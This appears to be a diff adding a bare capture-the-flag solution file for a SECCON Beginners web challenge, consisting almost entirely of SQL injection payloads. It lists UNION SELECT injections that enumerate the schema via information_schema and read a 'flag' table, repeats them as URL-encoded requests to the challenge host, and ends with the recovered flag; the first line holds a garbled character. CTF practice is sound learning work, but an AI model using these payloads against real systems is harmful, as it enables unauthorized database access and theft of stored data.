@@ -1,0 +1,17 @@
+MySQLÅB
+
+' UNION SELECT 0, 1 --
+
+' UNION SELECT 0, table_name FROM information_schema.tables --
+
+' UNION SELECT 0, column_name FROM information_schema.columns WHERE table_name = 'flag' --
+
+' UNION SELECT 0, flag FROM flag --
+
+https://ramen.quals.beginners.seccon.jp/?username=%27%20UNION%20SELECT%200%2C%20table_name%20FROM%20information_schema.tables%20--%20
+
+https://ramen.quals.beginners.seccon.jp/?username=%27%20UNION%20SELECT%200%2C%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%20%3D%20%27flag%27%20--%20
+
+https://ramen.quals.beginners.seccon.jp/?username=%27%20UNION%20SELECT%200%2C%20flag%20FROM%20flag%20--%20
+
+ctf4b{a_simple_sql_injection_with_union_select}
